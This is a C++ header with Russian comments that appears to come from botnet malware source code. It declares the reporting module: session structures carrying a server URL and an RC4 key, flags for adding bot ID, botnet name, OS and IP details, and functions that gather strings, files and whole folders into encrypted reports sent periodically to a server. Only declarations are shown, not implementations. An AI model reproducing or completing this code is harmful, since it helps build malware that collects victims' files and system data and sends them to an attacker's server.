/*
  Сбор и отправка отчетов.
*/
#pragma once

#include "..\common\crypt.h"
#include "..\common\binstorage.h"
#include "..\common\threadsgroup.h"

namespace Report
{
  typedef struct _SERVERSESSION
  {
    LPSTR url; //URL сервера.

    /*
      Функция вызываемая для формирования запроса.

      IN loop    - номер запроса для текущего соединения.
      IN session - данные сессии указаные в StartServerSession. Но pSession->pPostData - будет
                   содержать копию оригинального pSession->pPostData, которую вы можете свободно
                   изменять внутри этой функции, все изменения будут уничтожены сразу после
                   выполенния запроса. Приминять функцию BinStorage::_pack нельзя.

      Return     - SSPR_*
    */
    typedef int (*REQUESTPROC)(DWORD loop, _SERVERSESSION *session);
    REQUESTPROC requestProc;

    /*
      Функция вызываемая для обработки результата запроса (ответа сервера). Вызывается только в
      случаи успешного применения BinStorage::_unpack для ответа сервера.

      IN loop    - номер запроса для текущего соединения.
      IN session - данные сессии указаные в StartServerSession. Но pSession->pPostData - будет
                   содержать ответ сервера (уже обработаный BinStorage::_unpack). Указатель будет
                   уничтожен сразу после выхода из этой функции.

      Return     - SSPR_*
    */
    typedef int (*RESULTPROC)(DWORD loop, _SERVERSESSION *session);
    RESULTPROC resultProc;

    HANDLE stopEvent; //Сигнал прирывания.

    //Данные о ключе шифрования для pPostData. Ключ не будет менятся в ходе обработки запросов.
    Crypt::RC4KEY *rc4Key;

    BinStorage::STORAGE *postData; //Пост данные для оправки. При передачи на _Run может быть как NULL,
                                   //Так уже и созданная. Но не после BinStorage::_pack!

    void *customData; //Допольнительные данные для внешних функций.
  }SERVERSESSION;

  //Коды выхода для REQUESTPROC.
  enum
  {
    SSPR_CONTUNUE, //Продложить выполенение.
    SSPR_END,      //Сессия закончена.
    SSPR_ERROR     //Сессия закончена с ошибкой.
  };

  //Основные типы информация для добавления в лог.
  enum
  {
    BIF_BOT_ID       = 0x01, //Добавление BOTID и ботнет.
    BIF_BOT_VERSION  = 0x02, //Добавление версии бота.
    BIF_TIME_INFO    = 0x04, //Добавление данных о времени.
    BIF_OS           = 0x08, //Добавление информации об OS.
    BIF_PROCESS_FILE = 0x10, //Путь процесса.
    BIF_IP_ADDRESSES = 0x20  //Список IP-адресов.
  };

  //Флаги для writeFolderAsArchive.
  enum
  {
    WFAA_RECURSE = 0x1 //Сохранять поддиректории.
  };

  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Добавление базовой информации в отчет.

    IN OUT binStorage - конфигруция(отчет). Если на входе *pph == NULL, то функция создаст новую
                        конфигурацию
    IN flags          - флаги BIF_*.

    Return            - true - в случаи успеха, 
                        false - в случаи ошибки.
  */
  bool addBasicInfo(BinStorage::STORAGE **binStorage, DWORD flags);

  /*
    Создает потоков, служащий переодической отправки отчетов на сервер.

    IN group - группа потоков.

    Return   - true - в случаи успеха, 
               false - в случаи ошибки.
  */
  bool _create(ThreadsGroup::GROUP *group);

  /*
    Запуск сессии с сервером.

    IN session - сессия. 

    Return     - true - в случаи успешного заверщения сессии (соединение, корректность пакетов,
                 возврата SSPR_END от *_PROC)
                 false - в любом другом случаи.
  */
  bool startServerSession(SERVERSESSION *session);

  /*
    Запись данных в отчет (функция самого низкого уровня).

    IN type       - тип лога BLT_*.
    IN sourcePath - исходный путь или NULL. Обычно используется для данных BLT_FILE.
    IN destPath   - путь назначения или NULL. Обычно используется для данных BLT_FILE.
    IN data       - данные.
    IN dataSize   - размер данных.

    Return        - true - в случаи успеха, 
                    false - в случаи ошибки.
  */
  bool writeData(DWORD type, LPWSTR sourcePath, LPWSTR destPath, void *data, DWORD dataSize);

  /*
    Запись IStream данных в отчет.

    IN type       - тип лога BLT_*.
    IN sourcePath - исходный путь или NULL. Обычно используется для данных BLT_FILE.
    IN destPath   - путь назначения или NULL. Обычно используется для данных BLT_FILE.
    IN data       - данные.

    Return        - true - в случаи успеха, 
                    false - в случаи ошибки.
  */
  bool writeIStream(DWORD type, LPWSTR sourcePath, LPWSTR destPath, IStream *data);

  /*
    Запись в лог строки.

    IN type       - тип лога BLT_*.
    IN sourcePath - исходный путь или NULL. Обычно используется для данных BLT_FILE.
    IN destPath   - путь назначения или NULL. Обычно используется для данных BLT_FILE.
    IN string     - строка.

    Return        - true - в случаи успеха, 
                    false - в случаи ошибки.
  */
  bool writeString(DWORD type, LPWSTR sourcePath, LPWSTR destPath, LPWSTR string);
    
  /*
    Запись в лог строки по формату.

    IN type       - тип лога BLT_*.
    IN sourcePath - исходный путь или NULL. Обычно используется для данных BLT_FILE.
    IN destPath   - путь назначения или NULL. Обычно используется для данных BLT_FILE.
    IN format     - формат строки.
    IN ...        - аргументы.

    Return        - true - в случаи успеха, 
                    false - в случаи ошибки.
  */
  bool writeStringFormat(DWORD type, LPWSTR sourcePath, LPWSTR destPath, LPWSTR format, ...);

  /*
    Запись файла в отчет.

    IN file       - исходный файл.
    IN sourcePath - исходный путь, если указать NULL, то будет использоваться file.
    IN destPath   - путь назначения или NULL.

    Return        - true - в случаи успеха, 
                    false - в случаи ошибки.
  */
  bool writeFile(LPWSTR file, LPWSTR sourcePath, LPWSTR destPath);
  
  /*
    Запись папки(с подпапками) в отчет в виде архива.

    IN path          - исходная папка.
    IN fileMask      - массив масок файлов.
    IN fileMaskCount - кол. элементов в fileMask.
    IN destPath      - путь назначения или NULL.
    IN flags         - флаги WFAA_*.

    Return           - true - в случаи успеха, 
                       false - в случаи ошибки.
  */
  bool writeFolderAsArchive(LPWSTR path, LPWSTR *fileMask, DWORD fileMaskCount, LPWSTR destPath, DWORD flags);
};
